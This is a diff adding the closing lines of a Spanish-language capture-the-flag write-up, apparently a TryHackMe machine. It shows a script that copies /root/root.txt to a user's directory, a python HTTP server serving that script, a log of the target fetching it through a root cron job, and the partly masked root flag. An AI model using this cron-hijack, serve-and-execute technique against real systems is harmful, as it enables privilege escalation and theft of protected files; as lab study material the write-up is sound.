@@ -329,3 +329,17 @@ Y creo el script.
 nano buildscript.sh
 cat /root/root.txt > /home/james/flag2.txt
 
+Abro un servidor http con python y espero que se ejecute el crontab.
+
+~$ sudo python3 -m http.server 80 --bind 192.168.131.65
+Serving HTTP on 192.168.131.65 port 80 (http://192.168.131.65:80/) ...
+10.128.130.76 - - [22/Jun/2026 13:37:01] "GET /downloads/src/buildscript.sh HTTP/1.1" 200 -
+
+
+james@ip-10-128-130-76:~$ ls
+flag2.txt  todo.txt  user.txt
+
+james@ip-10-128-130-76:~$ cat flag2.txt 
+thm{7f33**********************bb}
+
+Y así ya tengo las dos flags.
